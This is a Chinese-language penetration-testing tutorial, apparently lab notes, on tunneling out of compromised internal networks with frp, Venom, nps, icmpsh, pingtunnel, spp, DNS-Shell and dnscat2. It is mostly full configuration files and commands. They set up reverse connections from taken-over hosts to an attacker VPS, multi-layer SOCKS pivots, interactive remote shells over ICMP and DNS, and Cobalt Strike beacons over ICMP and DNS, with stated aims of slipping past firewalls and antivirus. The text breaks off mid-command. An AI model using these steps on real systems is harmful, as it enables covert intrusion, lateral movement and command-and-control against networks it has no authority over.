隧道技术（Tunneling）是一类网络协议，它是一种数据包封装技术，它将原始IP包（其报头包含原始发送者和最终目的地）封装在另外一个数据包（称为封装的IP包）的数据净荷中进行传输，使用隧道的原因是在不兼容的网络上传输数据，或在不安全网络上提供一个安全路径，隧道协议通常（但并非总是）在一个比负载协议还高的层级或同一层。

隧道解决了什么问题？

隧道主要就是为了解决数据包无法传输，隧道技术一般用来绕过一些安全设备的监控，例如防火墙过滤，网络连接通讯，数据回链封装等，如果安全防护设备对我们发送的流量进行拦截，我们就可以使用隧道技术来绕过拦截，隧道技术就是使用不同的协议技术来建立通讯连接,当然，在隧道中也是包含了一些关于代理的技术。

​	OSI七层相关协议，注意协议是向下兼容，TCP协议被禁用了，基于TCP协议的HTTP/S协议也将不能用。

​	Socks4属于会话层，基于tcp，socks5即可以TCP也可以UDP

![](image-20240818213052191.png)

![image-20240818213533668](image-20240818213533668.png)

```
应用层：SSH隧道、HTTP/S隧道、DNS隧道
传输层：TCP隧道、UDP隧道
网络层：IPv6隧道、ICMP隧道
```

[OSI七层协议模型与记忆口诀_osi七层模型记忆口诀-CSDN博客](https://blog.csdn.net/f601323135/article/details/121332697)



### Tcp隧道

两台主机之间数据的交换建立在TCP/IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。也就是常规出网的情况了。http也是基于tcp的。tcp被禁，http隧道相关随之失效

#### Frp的使用

Frp(Fast Reverse Proxy) 是一款简单，好用，稳定的隧道工具。Frp 使用 Go语言开发，支持跨平台，仅需下载对应平台的二进制文件即可执行，没有额外依赖。它是一款高性能的反向代理应用，可以轻松地进行内网穿透，对外网提供服务。Frp 支持 TCP、UDP、KCP、HTTP、HTTPS 等协议类型，并且支持 Web服务根据域名进行路由转发。在进行内网渗透中，FRP 是常用的一款隧道工具。

仓库地址：https://github.com/fatedier/frp

官方文档：https://gofrp.org/zh-cn/docs/

注意： frp 0.52.0 版本后支持 TOML、YAML 和 JSON 配置文件，并弃用 INI 配置文件，将在未来版本中删除对 INI 的支持，这里使用低版本0.40来进行实验

校验配置

```
./frps verify -c ./frps.ini
./frpc verify -c ./frpc.ini
在使用之前，可以先执行命令校验配置文件中的语法是否正确。
```

![image-20240825195406422](image-20240825195406422.png)

##### Frp做反向Socks5代理

我们获得了一个位于内网的通过 NAT 方式对外提供服务的主机的权限，现在我们需要对其所在的内网继续进行渗透。于是，我们就需要通过FRP 建立一个隧道，让我们的主机可以通过隧道访问其内网

```
服务端配置
[common]
bind_addr = 0.0.0.0
bind_port = 7000
dashboard_addr = 0.0.0.0
dashboard_port = 7001
dashboard_user = root
dashboard_pwd = 123456
token = mibaihu
客户端
[common]
server_addr = 120.25.195.29
server_port = 7000
token = mibaihu
pool_count = 5
health_check_type = tcp
health_check_interval_s = 100
[test]
remote_port = 12345
plugin = socks5
use_encryption = true
use_compression = true
plugin_user = admin
plugin_passwd = 123456

-----------------------
remote_port = 12345：指定 FRP 服务器上的端口。客户端的流量会被转发到这个端口。
plugin = socks5：指定插件类型为 SOCKS5 代理。
use_encryption = true：启用加密。设置为 true 表示启用流量加密。
use_compression = true：启用压缩。设置为 true 表示启用流量压缩。
plugin_user = admin：指定 SOCKS5 代理插件的用户名。
plugin_passwd = 123456：指定 SOCKS5 代理插件的密码。
```

开放安全组的7000，7001端口

```
服务端： ./frps -c frps.ini
客户端： ./frpc -c frpc.ini
```

客户端成功连接

![image-20240825202725151](image-20240825202725151.png)

访问仪表板可以查看相关的信息。仪表板的相关配置端口，密码在图中已经配置好了。

<img src="image-20240825202658626.png" alt="image-20240825202658626" style="zoom:67%;" />

我们走socks5的代理 端口设置服务端的地址:12345 点击身份验证，admin:123456,可以直连

<img src="image-20240825204550150.png" alt="image-20240825204550150" style="zoom: 67%;" />

##### Frp映射RDP&SSH服务

将内网机的3389服务映射到vps上。前提保证他们两互相之间能通信

```
RDP服务端
[common]
bind_addr = 0.0.0.0
bind_port = 7000
dashboard_addr = 0.0.0.0 
dashboard_port = 7001 
dashboard_user = root 
dashboard_pwd = 123456 
token = mibaihu

RDP客户端
[common] 
server_addr = 你的vps
server_port = 7000
token = miabihu 
[RDP] 
local_ip = 127.0.0.1 
local_port = 3389 
remote_port = 3389
配置成功使用vps地址：3389连接就是内网机的3389服务

ssh服务端选择跟上面的一样
ssh客户端
[common] 
server_addr = 你的vps
server_port = 7000
token = miabihu 
[SSH] 
local_ip = 127.0.0.1
local_port = 22 
remote_port = 2222
----------------------------------------------
ssh -p 2222 root@你的vps地址 即可以访问内网的ssh服务
frp映射什么服务，可以参考上面仿写
```

![image-20240826102229544](image-20240826102229544.png)



##### Frp内网穿透

如下场景，位于内网的主机需要对外提供 Web 服务，于是将内网主机的 80 端口映射到公网主机的 80 端口上

```
配置如下
服务端
[common]
bind_addr = 0.0.0.0
bind_port = 7000
dashboard_addr = 0.0.0.0
dashboard_port = 7001
dashboard_user = root
dashboard_pwd = 123456
token = mibaihu
客户端
[common]
server_addr = 120.25.195.29
server_port = 7000
token = mibaihu
[HTTP]
type = tcp
local_ip = 127.0.0.1
local_port = 80
remote_port = 80
custom_domains= www.test.com
```

kali在开启一个web80端口的服务，sudo python3 -m http.server 80

客户端建立成功

![image-20240825212919557](image-20240825212919557.png)

访问公网vps的80端口就是访问内网的80web的服务

![image-20240825213110412](image-20240825213110412.png)

##### Frp建立多层内网代理

实验环境

```
三层内网
边界外网机 Ubuntu1  192.168.88.154  10.10.10.137  （能通外网）
win12-1 10.10.10.134  10.10.10.20.128
win12-2 10.10.20.129  10.10.30.128 
ubuntu2  10.10.30.129  10.10.40.128
注意：192.168.88.154能通外网，其他网段不能
```

在vmare新建添加网络，192.168.88.0为nat确保外网通信。其余网段设置为仅主机模式

![image-20240826110536018](image-20240826110536018.png)

把自己物理机的这四个实验网段的网卡禁了，避免影响实验，在ping一下192.168.88.0，10.10.10.0等这几个网段，ping不出即可

<img src="image-20240826114147102.png" alt="image-20240826114147102" style="zoom:67%;" />

先把web外网机Ubuntu拿下，放置frpc和 frpc.ini，配置如下

```
服务端配置
[common]
bind_addr = 0.0.0.0
bind_port = 7000
dashboard_addr = 0.0.0.0
dashboard_port = 7001
dashboard_user = root
dashboard_pwd = 123456
token = mibaihu
客户端
[common]
# 如果tls_enable为true，则frpc将通过tls连接frps。否则可能运行不起来
tls_enable = true
server_addr = 120.25.195.29
server_port = 7000
[plugin_socks]
type = tcp
remote_port = 7777
plugin = socks5

-------------------------
nohup ./frpc -c ./frpc.ini >/dev/null 2>&1 &
让进程在后台执行，在终端可以执行其他操作
window端是这样
start /b frpc.exe -c frpc.ini
```

客户端建立连接成功

![image-20240826115605635](image-20240826115605635.png)

在物理机上使用隧道代理软件，配置自己的vps地址和7777端口。设置好socks5代理测试连接，连接成功证明代理成功

<img src="image-20240826115123222.png" alt="image-20240826115123222" style="zoom:80%;" />

创建多级代理的配置如下，第一层设置好10.10.10.0的网段

<img src="image-20240826152342358.png" alt="image-20240826152342358" style="zoom:67%;" />

顺便起一个Ubuntu的web服务，现在没有代理的情况访问

<img src="image-20240826152400031.png" alt="image-20240826152400031" style="zoom:67%;" />

有了代理之后的访问

<img src="image-20240826152225683.png" alt="image-20240826152225683" style="zoom:67%;" />

###### 访问第二层内网

拿下了web外网ubuntu机之后，服务端配置好并启动frp服务端，此时ubuntu的frpc客户端服务停掉要修改再启动。启动客户端和服务端

我们的vps不需要停服务

```
Ubuntu服务端
[common]
bind_addr = 10.10.10.137
bind_port = 7000
token= mibaihu
----------------------------
Ubuntu客户端
[common]
tls_enable = true
server_addr = 120.25.195.29    
server_port = 7000
token= mibaihu
[http_proxy]
type = tcp
remote_port = 7777
#plugin = socks5，不能加上这个
#相较于一级代理，增加如下两个配置
local_ip = 10.10.10.137
local_port = 7777
```

![image-20240826153044042](image-20240826153044042.png)

我们在win12-1这个主机配置frp的客户端

```
[common]
server_addr = 10.10.10.137
server_port = 7000
token= mibaihu
[http_proxy]
type = tcp
remote_port = 7777	  
plugin = socks5
```

​		win2012-1客户端成功执行。10.10.20.0网段要被打通了

![image-20240826153742930](image-20240826153742930.png)

代理链加上这个网段。

<img src="image-20240826153941924.png" alt="image-20240826153941924" style="zoom:67%;" />

成功访问10.10.10.128端口8888的内网网站，没有代理是进不去的。

<img src="image-20240826154232621.png" alt="image-20240826154232621" style="zoom: 50%;" />

此时win2012-2的服务也是可以访问，他又10.10.20.129d的网卡

![image-20240826155633390](image-20240826155633390.png)

###### 访问第三层内网

在上面二层网络时，win12-1只做了frp客户端，同样的要访问第三层网络，也需要将其设置为frp服务端。ubuntu的frp不需要动

```
服务端
[common]
#ip都是设置为下层网络的ip
bind_addr = 10.10.20.128
bind_port = 7000
token= mibaihu
-----------------------
客户端
[common]
server_addr = 10.10.10.137
server_port = 7000
token= mibaihu
[http_proxy]
type = tcp
remote_port = 7777	  
#plugin = socks5
local_ip = 10.10.20.128
local_port = 7777
```

win12-2设置frpc客户端，配置如下

```
[common]
server_addr = 10.10.20.128
server_port = 7000
token= mibaihu
[http_proxy]
type = tcp
remote_port = 7777	  
plugin = socks5
```

win12-2连接成功，进而打通10.10.30网段

![image-20240826165505268](image-20240826165505268.png)

在代理规则上添加上10.10.30.*即可。至此访问所有主机

每一层的 `frpc` 必须能够访问其上层的 `frps`，所以需要确保网络通畅。

​	参考：https://blog.csdn.net/ss810540895/article/details/124987061

#### Venom的使用

Venom工具也被称为“毒液工具”，它是一款开源的多级代理工具，使用Go语言开发，支持多种平台。Venom可以将多个节点进行连接，并以节点为跳板构建多级代理搭建网络隧道，[渗透测试](https://cloud.tencent.com/product/wpt?from_column=20065&from=20065)人员可以使用Venom轻松地将网络流量代理到多层内网管理代理节点，利用"毒液"进行可视化网络拓扑、多级Socks5代理、多级端口转发、端口复用（Apache、Mysql等服务）、SSH隧道、交互式Shell、文件的上传和下载、节点间通信加密等。

仓库地址：https://github.com/Dliv3/Venom

##### 会话基本命令

```
这是会话的基本命令，此处进行了汉化
help：显示帮助信息。
exit：退出工具。
show：显示网络拓扑。
getdes：查看目标节点的描述。
setdes [info]：为目标节点添加描述。
goto [id]：选择目标节点。
listen [lport]：在目标节点上监听指定端口。
connect [rhost] [rport]：通过目标节点连接到新节点。 // connect 10.211.55.7 9999
sshconnect [user@ip:port] [dport]：通过 SSH 隧道连接到新节点。 // sshconnect root@10.211.55.15:22 6666
shell：在目标节点上启动交互式 Shell。 
upload [local_file] [remote_file]：将文件上传到目标节点。//upload /tmp/test.txt C:\test.txt 
download [remote_file] [local_file]：从目标节点下载文件。 // download C:\test2.txt /tmp/test2.txt
socks [lport]：启动一个 socks5 服务器。
lforward [lhost] [sport] [dport]：将本地端口转发到远程端口。//lforward 127.0.0.1 8888 8888
rforward [rhost] [sport] [dport]：将远程端口转发到本地端口。//rforward 10.211.55.7 3389 3389
```

实验环境

```
kali攻击机：192.168.88.185 
web机ubuntu：192.168.88.154 10.10.10.137
```



##### 反向监听配置

kali攻击机执行./admin_linux_x64 -lport 8888 其中lport为本地端口的意思，让客户端受控机反向连接kali的8888，适用于出网的环境

ubuntu执行 ./agent_linux_x64  -rhost 192.168.88.185 -rport 8888 //rhost为攻击机地址，rport为攻击机的远程端口

​	<img src="image-20240826212158521.png" alt="image-20240826212158521" style="zoom: 80%;" />

![image-20240826212601755](image-20240826212601755.png)

A 表示 admin 节点，数字表示 agent 节点。

```
相关命令
goto 1 进入agent节点
shell 进入交互式shell
exit 退出shell
```

![image-20240826213851875](image-20240826213851875.png)

先setdes，才能getdes。对节点的描述，相当于注释

![image-20240826214509245](image-20240826214509245.png)

##### 正向监听配置

按名字理解就是反过来。攻击机和web机的命令互换。就是不出网的情况。但能正常访问主机，以正向连接的形式进行渗透

攻击机kali配置：./admin_linux_x64 -rhost 192.168.88.154 -rport 8888

ubuntu配置：./agent_linux_x64  -lport 8888

![image-20240826221959708](image-20240826221959708.png)

进入会话之后，选择goto 节点id，做socks正向代理的转发到本地的1024 ----命令：socks 1024

再从proxychains做配置，就能访问目标3389服务

<img src="image-20240826232110345.png" alt="image-20240826232110345" style="zoom:67%;" />

##### 端口复用功能

假设上传webshell后，Web服务器只有80端口的开放http服务可以利用，下面我们通过venom工具的SO_REUSEPORT"和"SO_REUSEADDR选项进行端口复用，Windows服务器下复用apache中间件的http服务8000端口，不影响正常使用。

```
 先开启一个web 8000服务，python2 -m SimpleHTTPServer 8000
 客户端winserver12使用：agent.exe -lhost 192.168.0.25 -reuse-port 8000
 服务端kali使用：./admin_linux_x64  -rhost 192.168.88.142  -rport 8000
```

![image-20240826230052814](image-20240826230052814.png)

##### 节点间通信加密

在节点通讯请求和响应的过程中，如果消息中途被劫持或篡改后果不堪设想，而我们的Venom工具支持隧道通信加密，对通讯数据进行加密保护，本地通过-passwd参数选项指定密码进行设置，密码用于生成AES加密所需的密钥

```
攻击端:admin.exe -lport 8888 -passwd mibaihu

web端:agent -rhost 192.168.0.58 -rport 8888 -passwd mibaihu
```

##### Venom多层代理

###### 	二层代理情况

假设场景上，一个内网里面有两个网段，其中一个网段内网主机 A 能出网，内网主机 B 不能出网.

实验环境：

```
攻击机ubuntu：120.25.195.29
linux服务器A：192.168.88.154  10.10.10.137 (192.168.88.154能通外网)
window服务器B：10.10.10.136
```

做反向监听攻击机：./admin_linux_x64 -lport 7777
让linux服务器反向连接；./agent_linux_x64 -rhost 120.25.195.29 -rport 7777

<img src="image-20240827104306561.png" alt="image-20240827104306561" style="zoom:80%;" />

第一层建立成功之后，打到10.10.10.136这台机器。在这里部署好10.10.10.136的agent并运行agent.exe -lport 7777

接下来让服务器A去正向连接这台服务器B即可。在服务器端进入A的节点

```
goto 1   进入服务器的A节点
connect 10.10.10.136 7777  对该服务器B进行连接
建立连接成功，show一下看看就有了两层，有层级关系为1节点连接2节点
```

![image-20240827104750486](image-20240827104750486.png)

怎么看节点之间的关系？

![image-20240827104939318](image-20240827104939318.png)

admin 节点下连接了 1 节点，1 节点下连接了 2、4 节点，2节点下连接了 3 节点

二层以上的代理都是一样的操作。都是在上一层的节点当中使用connect x.x.x.x 7777 其中端口之间不变。节点之间相连能通信。下层的节点开启本地端口如：agent.exe -lport 7777，等着上一个节点主动正向连接。都是一样的思路。比frp的多层代理操作简单方便很多，但是实际上理解起来都是一样的

参考：https://cloud.tencent.com/developer/article/2354812

​			https://blog.csdn.net/qq_33530840/article/details/140036168

流量也是基于tcp协议

![image-20240827111546769](image-20240827111546769.png)

#### nps的使用

NPS 是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持 tcp、udp 流量转发，可支持任何 tcp、udp 上层协议（访问内网网站、本地支付接口调试、ssh 访问、远程桌面，内网 dns 解析等等……），此外还支持内网 http 代理、内网 socks5 代理、p2p 等，并带有功能强大的 web 管理端。

仓库地址：https://github.com/ehang-io/nps/releases

官方文档：https://ehang-io.github.io/nps/#/?id=nps

又编译好的版本，在这里选择对应的系统架构https://github.com/ehang-io/nps/releases/tag/v0.26.10

也是分为服务端和客户端存在。注意服务端启动会占用80，443，8024(默认端口是可以改的)

##### 更改服务端服务端配置文件

在/conf/nps.conf下，专注改那几个端口号

```
appname = nps
#Boot mode(dev|pro)
runmode = dev

#HTTP(S) proxy port, no startup if empty
http_proxy_ip=0.0.0.0
http_proxy_port=80
https_proxy_port=443
https_just_proxy=true
#default https certificate setting
https_default_cert_file=conf/server.pem
https_default_key_file=conf/server.key

##bridge
bridge_type=tcp
bridge_port=7777	//这里是客户端连接的端口，默认为8024，我改成7777
bridge_ip=0.0.0.0

# Public password, which clients can use to connect to the server

# After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.

public_vkey=123

#Traffic data persistence interval(minute)
#Ignorance means no persistence
#flow_store_interval=1

# log level LevelEmergency->0  LevelAlert->1 LevelCritical->2 LevelError->3 LevelWarning->4 LevelNotice->5 LevelInformational->6 LevelDebug->7

log_level=7
#log_path=nps.log

#Whether to restrict IP access, true or false or ignore
#ip_limit=true

#p2p
#p2p_ip=127.0.0.1
#p2p_port=6000

#web
web_host=a.o.com
web_username=admin			//服务端web登录默认密码，你可以改
web_password=admin123	//密码最好也不要用默认的
web_port = 8080              //服务端登录的web默认端口
web_ip=0.0.0.0				
web_base_url=
web_open_ssl=false
web_cert_file=conf/server.pem
web_key_file=conf/server.key

# if web under proxy use sub path. like http://host/nps need this.

#web_base_url=/nps

#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)
#Remove comments if needed
#auth_key=test
auth_crypt_key =1234567812345678

#allow_ports=9001-9009,10001,11000-12000

#Web management multi-user login
allow_user_login=false
allow_user_register=false
allow_user_change_username=false


#extension
allow_flow_limit=false
allow_rate_limit=false
allow_tunnel_num_limit=false
allow_local_proxy=false
allow_connection_num_limit=false
allow_multi_ip=false
system_info_display=false

#cache
http_cache=false
http_cache_length=100

#get origin ip
http_add_origin_header=false

#pprof debug options
#pprof_ip=0.0.0.0
#pprof_port=9999

#client disconnect timeout
disconnect_timeout=60
```

服务端启动使用./nps就可以了。如果端口占用是启用不了的

http://你的vps:8080 就可以启用了

<img src="image-20240827160921403.png" alt="image-20240827160921403" style="zoom:67%;" />

<img src="image-20240827161149969.png" alt="image-20240827161149969" style="zoom:67%;" />



##### 新建客户端配置

<img src="image-20240827163042916.png" alt="image-20240827163042916" style="zoom:80%;" />

在ubuntu上传一个客户端，客户端根据配置来填写命令反连

客户端：./npc -server=120.25.195.29:7777  -vkey=mibaihu，点击右边的刷新即可看到

![image-20240827163343619](image-20240827163343619.png)

##### socks5代理

在侧边栏socks代理那里像客户端配置点击新增，配置可以看着填，如图

![image-20240827163517225](image-20240827163517225.png)

服务端口8888一定要在vps放行。刷新一下即可看到

![image-20240827163658101](image-20240827163658101.png)

看到id左边这个加号，没有，点击一下。他的配置信息会罗列出来，这个socks5是有密码的。密码为你客户端配置的基础认证密码

![image-20240827164044553](image-20240827164044553.png)

配合Proxifier成功连接上。本机能访问客户端的流量

![image-20240827164126697](image-20240827164126697.png)

##### rdp映射&http正向代理配置

rdp映射，去侧边栏找到tcp隧道新增，配置好客户端的相关参数，访问vps的端口3389就是客户端的3389，你想映射什么服务，就配置就行了。单单拿3389来举例而已

<img src="image-20240827164502471.png" alt="image-20240827164502471" style="zoom: 67%;" />

访问之后很明显是Linux的远程服务界面

<img src="image-20240827164629779.png" alt="image-20240827164629779" style="zoom: 67%;" />

​	http正向代理配置，制定好客户端id和服务端端口

![image-20240827164731407](image-20240827164731407.png)

然后在客户端主机ubuntu上开启一个web服务器，没挂上代理访问不了，挂了浏览器代理即可访问

![image-20240827164903595](image-20240827164903595.png)

##### 私密代理配置

适用范围： 无需占用多余的端口、安全性要求较高可以防止其他人连接的 tcp 服务，例如 ssh。无需新增多的端口实现访问内网服务器 1客户端的22 端口。配置上要多加了一个唯一密钥的配置

另外客户端加了要写成案例如下：

```
./npc  -server=192.168.88.185:8024 -vkey=6knHfew6 -type=tcp -password=miyao -local_type=secret -local_port=2222
```

-vkey是你的客户端登录时候的密钥，-password是私密代理要额外配置的密钥

##### nps搭建多级代理

可以参考：https://mp.weixin.qq.com/s/qnZwp536p7tm_1E1_5RAcw 这类的多级代理都是一层扣一层，不演示了

### icmp隧道

如果目标只有 icmp 协议能出网的话，则只有考虑使用 icmp 协议来搭建隧道了利用。 icmp 协议通信的工具有很多，如：icmpsh、reverse-icmp-shell、PingTunnel、IcmpTunnel。ICMP 隧道简单实用，是一个比较特殊的协议。在一般的通信协议里，如果两台
设备要进行通信，肯定需要开放端口，而在 ICMP 协议下就不需要。最常见的ping 命令就是利用的 ICMP 协议，攻击者可以利用命令行得到比回复更多的 ICMP请求。在通常情况下，每个 ping 命令都有相应的回复与请求。在一些网络环境中，如果攻击者使用各类上层隧道(例如：HTTP 隧道、DNS 隧道、常规正/反向端口转发等)进行的操作都失败了，常常会通过 ping 命令访问远程计算机，尝试建立 ICMP 隧道，将 TCP/UDP 数据封装到 ICMP 的 ping 数据包中，从而穿过防火墙(防火墙一般不会屏蔽 ping 的数据包)，实现不受限制的访
问。

#### 使用 ICMP 进行命令控制

适用场景：目标机器是 Windows 服务器的情况

icmpsh：仓库地址： https://github.com/inquisb/icmpsh.git

icmpsh是⼀个简单的反向ICMP shell⼯具。与其他类似的开源⼯具相⽐，主要优势在于它不需要管理权限即可在⽬标机器上运⾏。
缺点是客户端只能在Windows机器运⾏，服务端可以在任何平台上运⾏，客户端没改过落地会给杀软查杀

关闭icmp回复,如果要开启icmp回复，该值设置为0
sysctl -w net.ipv4.icmp_echo_ignore_all=1

```
服务端：
wets  https://bootstrap.pypa.io/pip/2.7/get-pip.py //下载pip2.7镜像源 
python2 get-pip.py //安装
python2 -m pip install   //安装对应的模块 impacket
sudo python2 icmpsh_m.py 192.168.88.185 192.168.88.187 //第⼀个IP是VPS的eth0⽹卡IP，第⼆个IP是⽬标机器出⼝的公⽹IP
```

```
 客户端：icmpsh.exe -t 192.168.88.185 -d 500 -b 30 -s 128
 t 主机ip地址以发送ping请求。这个选项是强制性的！
-r 发送⼀个包含字符串“Test1234”的测试icmp请求，然后退出。
-d 毫秒请求之间的延迟（毫秒）
-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空⽩计数器。如果该计数器达到某个极限，从机将退出。
如果收到响应，计数器将设置回0。
-b 空⽩数量限制（退出前未答复的icmp请求）
-s 字节最⼤数据缓冲区⼤⼩（字节）
```

<img src="image-20240822104614233.png" alt="image-20240822104614233" style="zoom:67%;" />

查看流量，走的都是icmp

<img src="image-20240822104645571.png" alt="image-20240822104645571" style="zoom:67%;" />

#### pingtunnel 的使用

pingtunnel 是一款把 tcp/udp/sock5 流量伪装成 icmp 流量进行转发的工具，需要root或者administrator/system权限。

项目地址：https://github.com/esrrhs/pingtunnel/

![image-20240819114008864](image-20240819114008864.png)

相关参数解释：

```
服务端参数
• -key：设置的密码，默认为 0
• -nolog：不写日志文件，只打印标准输出，默认 0
• -noprint：不打印屏幕输出，默认 0
• -loglevel：日志文件等级，默认 info
• -maxconn：最大连接数，默认 0，不受限制
• -maxprt：server 最大处理线程数，默认 100
• -maxprb：server 最大处理线程 buffer 数，默认 1000
• -conntt：server 发起连接到目标地址的超时时间，默认 1000ms
客户端参数
• -l：本地的地址，发到这个端口的流量将转发到服务器
• -s：服务器的地址，流量将通过隧道转发到这个服务器
• -t：远端服务器转发的目的地址，流量将转发到这个地址
• -timeout：地记录连接超时的时间，单位是秒，默认 60s
• -key：设置的密码，默认 0
• -tcp：设置是否转发 tcp，默认 0
• -tcp_bs：tcp 的发送接收缓冲区大小，默认 1MB
• -tcp_mw：tcp 的最大窗口，默认 20000
• -tcp_rst：tcp 的超时发送时间，默认 400ms
• -tcp_gz：当数据包超过这个大小，tcp 将压缩数据，0 表示不压缩，默认0
• -tcp_stat：打印 tcp 的监控，默认 0
• -nolog：不写日志文件，只打印标准输出，默认 0
• -noprint：不打印屏幕输出，默认 0
• -loglevel：日志文件等级，默认 info
• -sock5：开启 sock5 转发，默认 0
• -profile：在指定端口开启性能检测，默认 0 不开启
• -s5filter：sock5 模式设置转发过滤，默认全转发，设置 CN 代表 CN 地区的直连不转发
• -s5ftfile：sock5 模式转发过滤的数据文件，默认读取当前目录的GeoLite2-Country.mmdb
```

##### 	做正向socks5代理

​	服务端：kali linux

```
#关闭 icmp 回复,如果要开启 icmp 回复，该值设置为 0
sysctl -w net.ipv4.icmp_echo_ignore_all=1
#监听
./pingtunnel -type server -noprint 1 -nolog 1
```

![image-20240819121006268](image-20240819121006268.png)

客户端操作 win机

```
pingtunnel.exe -type client -l :1080 -s 39.99.251.19 -sock5 1 -noprint 1 -nolog 1
```

![image-20240819121024396](image-20240819121024396.png)

 打开代理服务器配置上可连通证明正向代理做好了

![image-20240819121118300](image-20240819121118300.png)

##### 做端口转发

```
服务端操作
#关闭 icmp 回复,如果要开启 icmp 回复，该值设置为 0
sysctl -w net.ipv4.icmp_echo_ignore_all=1
#监听
./pingtunnel -type server -noprint 1 -nolog 1
```

```
#将目标主机 192.168.88.140 的 8081 端口转发到本地的 8080 端口
pingtunnel.exe -type client -l :8080 -s 192.168.88.140 -t 192.168.88.140:8081 -tcp 1 -noprint 1 -nolog 1
```

#### icmp隧道上线cs

隧道代理工具千千万，spp的用法也是类似的，没必要单独学下去了。功能都是极其类似

这里主要用spp走icmp的隧道上线cs

[内网隧道工具SPP尝鲜 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9820?time__1311=n4%2BxnD0DuDRD9DUh0iD%2FjeYu0Dg7SSGDxfE%2BiD#toc-7)

[内网渗透-隧道搭建&ssp隧道代理工具&frp内网穿透_spp代理工具-CSDN博客](https://blog.csdn.net/rumil/article/details/139336456)

服务端（linux主机）：

```
./spp -type server -proto ricmp -listen 0.0.0.0
```

客户端（win主机）：

```
spp.exe -name "test" -type proxy_client -server 192.168.88.185 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp
```

监听器设置如下

![image-20240819183902911](image-20240819183902911.png)

生成http2的马，上传到客户端即可上线cs。

可以看到服务端和客户端发大量的icmp包。缺点是流量特征很明显。另外，如果服务端是公网ip容易掉包不容易上线，回显命令很慢

<img src="image-20240819184112303.png" alt="image-20240819184112303" style="zoom:67%;" />

还有ew+pingtunnnel我没实验，都是大同小异，具体参考这篇文章

[内网穿透之icmp隧道搭建+上线CS+环境场景搭建笔记 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/282931.html)

### DNS隧道

DNS 协议是一种请求、应答协议，也是一种可用于应用层的隧道技术。DNS 隧道的工作原理很简单，在进行 DNS 查询时，如果查询的域名不在 DNS 服务器本机缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠 DNS 协议即可进行数据包的交互。从 DNS 协议的角度来看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个 IP地址，而事实上返回的可以是任意的字符串，包括加密的 C&C 指令

![image-20240820095626045](image-20240820095626045.png)

在使用 DNS 隧道与外部进行通信时，从表面上看是没有连接外网的(内网网关没有转发 IP 数据包)。但实际上，内网的 DNS 服务器进行了中转操作。这就是 DNS 隧道的工作原理，简单地说，就是将其他协议封装在 DNS 协议中进行传输

#### DNS隧道上线CS

前置条件：配置ns域名记录

[DNS解析中的A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录、SRV记录、URL转发等 - petercao - 博客园 (cnblogs.com)](https://www.cnblogs.com/bluestorm/p/10345334.html)

配置A记录，ns的记录值指向A记录，即可配置正确

![image-20240820100650501](image-20240820100650501.png)

放行自己的53端口，最好是udp，tcp一起放行，后期还是会走tcp的流量

验证域名解析是否成功，在自己的vps输入这条

```
 tcpdump -n -i eth0 udp dst port 53
```

然后随便拿台主机ping她的nslookup 域名地址 查看记录看到即可

<img src="image-20240820101009871.png" alt="image-20240820101009871" style="zoom:80%;" />

cs监听器配置如下

<img src="image-20240820102055762.png" alt="image-20240820102055762" style="zoom:80%;" />

payload项写ns记录的域名，DNS地址填A记录的域名

vps为ubuntu，Ubuntu有一个应用占用了53端口，这个服务是systemd-resolved，关闭就可以启动了

```
systemctl stop systemd-resolved
```

生成好Windows可执行程序(stageless)进行上线

上线后进入会话，我们需要执行以下命令，让目标主机信息显示出来

```
checkin
mode dns-txt
```



![image-20240820103327384](image-20240820103327384.png)

![image-20240820103456457](image-20240820103456457.png)

回显肉眼可见的太慢，坑点太多

![image-20240820105218727](image-20240820105218727.png)

看了这个博客其实发现Stager下的地址可以不配A地址，也可以配ns的地址。发现也可行。但是还是回显慢。万不得已再用这种

命令没有回显，估计要配置文件c2 profile

[CS上线之DNS隧道踩坑记 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/256032.html)

#### DNSshell脚本命令控制

项目地址：git clone https://github.com/sensepost/DNS-Shell.git

  DNS-Shell 运行机制
该工具所使用的 Payload 会在服务器端脚本被调用时自动生成，Payload 会使用nslookup 来向服务器端查询和请求新的操作命令，接下来服务器端会监听端口 53并等待传入的连接。当 Payload 在目标设备上成功执行后，服务器端将会生成一个交互式 Shell 并提供给用户进行操作。通信信道建立成功后，Payload 会继续向服务器查询和请求新的操作指令，当攻击者在服务器端输入新的操作命令后，Payload 将会收到命令并执行该命令，然后在命令执行成功后将执行结果返回给服务器端。

相关命令：python2 DNS-shell.py -l -d 192.168.88.185 //192.168.88.185 这里为你的服务端地址

会生成的powershell命令进行编码，客户端输入powershell.exe -e 粘贴payload即可

![image-20240820114404320](image-20240820114404320.png)

连接倒是能连接成功，命令执行跟cs一样基本上不回显。通信流量 都是dns

#### Dnscat2命令控制

Dnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道。
Dnscat2分为client端和server端，client运行在被控机器上，server运行在DNS服务器上。client，server部分分别是用C，ruby写的。其中作者在实现client部分时实现了跨平台，支持linux和windows编译运行。在完成连接建立后可以实现建立shell，上传下载文件等功能

window客户端有直接编译好的版本，全版本都在这里https://downloads.skullsecurity.org/dnscat2/，如果遇到密码，解压密码为password

```
https://downloads.skullsecurity.org/dnscat2/
下载这里面的dnscat2-v0.07-client-source.zip
并在Ubuntu下解压，cd解压目录，终端输入make，推荐这种，在Ubuntu和centos都可以运行

其实在kali下直接拉下来的https://github.com/iagox86/dnscat2.git也包含了客户端也可以直接make
但是make之后在哪里运行都报一个遇到 GLIBC 版本不匹配的问题
./dnscat: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.33' not found (required by ./dnscat)
./dnscat: /lib/x86_64-linux-gnu/libc.so.6: version GLIBC_2.34' not found (required by ./dnscat) 
```

```
服务端：
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo apt install ruby-full //安装ruby 
gem install bundler      // 用于安装 Bundler 以管理 Ruby 项目的依赖。
